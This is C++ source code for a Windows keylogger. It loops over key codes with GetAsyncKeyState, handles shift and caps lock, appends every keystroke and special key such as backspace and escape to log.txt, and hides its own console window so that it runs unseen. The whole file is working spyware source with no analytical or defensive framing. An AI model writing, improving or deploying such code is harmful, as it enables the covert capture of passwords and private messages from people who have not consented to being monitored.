#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>
using namespace std;
void log()
{
    char c;
    while (true)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                std::ofstream write("log.txt", ios::app);

                if (!GetAsyncKeyState(0x10) && (c > 64 && c < 91))  // TO CHECK SHIFT IS PRESSED
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91) && GetAsyncKeyState(0x10))
                {
                    write << c;
                    write.close();
                    break;
                }
                else if (!GetAsyncKeyState(0x14) && (c > 64) && (c < 91)) //CAPS IS ON OR NOT
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if (GetAsyncKeyState(0x14) && (c > 64) && (c < 91))
                {
                    write << c;
                    write.close();
                    break;
                }
                else
                {
                    switch (c)                                           //SPECIAL CHARACTERS
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))write << ")";
                        else write << "0";
                        break;
                    }
                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))write << "!";
                        else write << "1";
                        break;
                    }
                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))write << "@";
                        else write << "2";
                        break;
                    }
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))write << "#";
                        else write << "3";
                        break;
                    }
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))write << "$";
                        else write << "4";
                        break;
                    }
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))write << "%";
                        else write << "5";
                        break;
                    }
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))write << "^";
                        else write << "6";
                        break;
                    }
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))write << "&";
                        else write << "7";
                        break;
                    }
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))write << "*";
                        else write << "8";
                        break;
                    }
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))write << "(";
                        else write << "9";
                        break;
                    }
                    case VK_SPACE:
                    {
                        write << " ";
                        break;
                    }
                    case VK_RETURN:
                    {
                        write << "\n";
                        break;
                    }
                    case VK_TAB:
                    {
                        write << "	";
                        break;
                    }
                    case VK_BACK:
                    {
                        write << "<BACKSPACE>\n";
                        break;
                    }
                    case VK_ESCAPE:
                    {
                        write << "<ESC>\n";
                        break;
                    }
                    case VK_DELETE:
                    {
                        write << "<DEL>\n";
                        break;
                    }
                    }
                }
            }
        }
    }
}

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main()
{
    HideConsole();
    log();
    return(0);
}
